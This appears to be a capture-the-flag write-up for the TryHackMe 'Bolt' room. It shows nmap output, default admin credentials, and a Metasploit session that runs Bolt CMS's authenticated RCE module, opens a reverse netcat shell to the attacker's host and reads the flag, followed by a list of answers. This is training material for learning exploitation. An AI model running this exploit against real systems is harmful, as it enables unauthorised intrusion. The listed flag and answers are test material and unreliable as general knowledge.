# Task 1 Deploy the machine
----

>>This room is designed for users to get familiar with the Bolt CMS and how it can be exploited using Authenticated Remote Code Execution. You should wait for at least 3-4 minutes for the machine to start properly.

>If you have any queries or feedback you can reach me through the TryHackMe Discord server or through Twitter.

----

# Task 2 Hack your way into the machine!
----

>>A hero is unleashed

>>Once you have successfully deployed the VM , enumerate it before finding the flag in the machine.

## SCANNING :

```bash
┌──(rawbot㉿kali)-[~]
└─$ nmap -sC -sV 10.10.90.9
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-12 01:54 EST
Nmap scan report for 10.10.90.9
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http    (PHP 7.2.32-1)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Wed, 12 Jan 2022 06:53:01 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Wed, 12 Jan 2022 06:53:01 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: ee83a3
|     <!doctype html>
|     <html lang="en">
|     <head>                                                                                                                
|     <meta charset="utf-8">                                                                                                
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">                                                
|     <title>Bolt | A hero is unleashed</title>                                                                             
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">                     
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">                                              
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">                                              
|     <meta name="generator" content="Bolt">                                                                                
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Wed, 12 Jan 2022 06:53:00 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Wed, 12 Jan 2022 06:53:00 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: 300490
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
|_http-generator: Bolt
|_http-title: Bolt | A hero is unleashed
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=1/12%Time=61DE7B55%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,14F5,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Wed,\x2012\x20Jan\x20
SF:2022\x2006:53:00\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP
SF:/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20pu
SF:blic,\x20s-maxage=600\r\nDate:\x20Wed,\x2012\x20Jan\x202022\x2006:53:00
SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-Toke
SF:n:\x20300490\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en-GB\">\n\x20\
SF:x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"u
SF:tf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20
SF:content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Bolt\x20\|\x20A
SF:\x20hero\x20is\x20unleashed</title>\n\x20\x20\x20\x20\x20\x20\x20\x20<l
SF:ink\x20href=\"https://fonts\.googleapis\.com/css\?family=Bitter\|Roboto
SF::400,400i,700\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/bulma\.css\
SF:?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"styleshe
SF:et\"\x20href=\"/theme/base-2018/css/theme\.css\?6cb66bfe9f\">\n\x20\x20
SF:\x20\x20\t<meta\x20name=\"generator\"\x20content=\"Bolt\">\n\x20\x20\x2
SF:0\x20\t<link\x20rel=\"canonical\"\x20href=\"http://0\.0\.0\.0:8000/\">\
SF:n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body\x20class=\"front\">\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<a\x20")%r(FourOhFourRequest,16C3,"HTTP/1
SF:\.0\x20404\x20Not\x20Found\r\nDate:\x20Wed,\x2012\x20Jan\x202022\x2006:
SF:53:01\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.32-1
SF:\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x20m
SF:ust-revalidate\r\nDate:\x20Wed,\x2012\x20Jan\x202022\x2006:53:01\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-cache
SF:\r\nexpires:\x20-1\r\nX-Debug-Token:\x20ee83a3\r\n\r\n<!doctype\x20html
SF:>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial
SF:-scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</title>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"https://fonts\.googleapis\
SF:.com/css\?family=Bitter\|Roboto:400,400i,700\"\x20rel=\"stylesheet\">\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/
SF:theme/base-2018/css/bulma\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/them
SF:e\.css\?6cb66bfe9f\">\n\x20\x20\x20\x20\t<meta\x20name=\"generator\"\x2
SF:0content=\"Bolt\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"#main-content\"\x20class=\"v
SF:is");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.44 seconds
```

>>There is a webpage which gives us the useranme and password.
>>USERNAME : bolt
>>PASSWORD : boltadmin123
>>URL : http://10.10.90.9:8000/

>>There is a (/bolt/login) login page but gobuster didn't catch up after logging with given creds the version of the bolt is displayed at the last of the webpage.  
>>URL : http://10.10.90.9:8000/bolt/dashboard
>>With that search with that version for exploits in exploit db.The previous version of that has authenticated rce vulnerability.
>>Using metasploit to get the shell. 

## GETTING A SHELL :

```bash
msf6 > search bolt cms 

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
   1  exploit/multi/http/bolt_file_upload         2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/bolt_file_upload

msf6 > use exploit/unix/webapp/bolt_authenticated_rce
[*] Using configured payload cmd/unix/reverse_netcat
msf6 exploit(unix/webapp/bolt_authenticated_rce) > options

Module options (exploit/unix/webapp/bolt_authenticated_rce):

   Name                 Current Setting        Required  Description
   ----                 ---------------        --------  -----------
   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from "/files" on the web server to "/root" on the
                                                          server
   PASSWORD                                    yes       Password to authenticate with
   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                      yes       The target host(s), see https://github.com/rapid7/metasploit-fra
                                                         mework/wiki/Using-Metasploit
   RPORT                8000                   yes       The target port (TCP)
   SRVHOST              0.0.0.0                yes       The local host or network interface to listen on. This must be a
                                                         n address on the local machine or 0.0.0.0 to listen on all addre
                                                         sses.
   SRVPORT              8080                   yes       The local port to listen on.
   SSL                  false                  no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI            /                      yes       Base path to Bolt CMS
   URIPATH                                     no        The URI to use for this exploit (default is random)
   USERNAME                                    yes       Username to authenticate with
   VHOST                                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Linux (cmd)

msf6 exploit(unix/webapp/bolt_authenticated_rce) > set lhost 10.9.1.90
lhost => 10.9.1.90
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set rhosts 10.10.90.9
rhosts => 10.10.90.9
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
PASSWORD => boltadmin123
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit

[*] Started reverse TCP handler on 10.9.1.90:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "onqygt".
[*] Found 3 potential token(s) for creating .php files.
[+] Deleted file lbhixbgfo.php.
[+] Used token 97dcf29762934fcd680237893b to create ebqvyokp.php.
[*] Attempting to execute the payload via "/files/ebqvyokp.php?onqygt=`payload`"
[!] No response, may have executed a blocking payload!
[*] Command shell session 1 opened (10.9.1.90:4444 -> 10.10.90.9:55812 ) at 2022-01-12 02:43:49 -0500
[+] Deleted file ebqvyokp.php.
[+] Reverted user profile back to original state.

ls
index.html
cd /home
ls
bolt
composer-setup.php
flag.txt
cat flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```

----

# ANSWER THE FOLLOWING :
----

1.Start the machine
>>No answer needed

2.What port number has a web server with a CMS running?
>>8000

3.What is the username we can find in the CMS?
>>bolt

4.What is the password we can find for the username?
>>boltadmin123

5.What version of the CMS is installed on the server? (Ex: Name 1.1.1)
>>Bolt 3.7.1

6.There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?
>>48296

7.Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)
Note: If you can't find the exploit module its most likely because your metasploit isn't updated. Run 
`apt update` then `apt install metasploit-framework`
>>exploit/unix/webapp/bolt_authenticated_rce

8.Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit
>>No answer needed

9.Look for flag.txt inside the machine.
>>THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}

----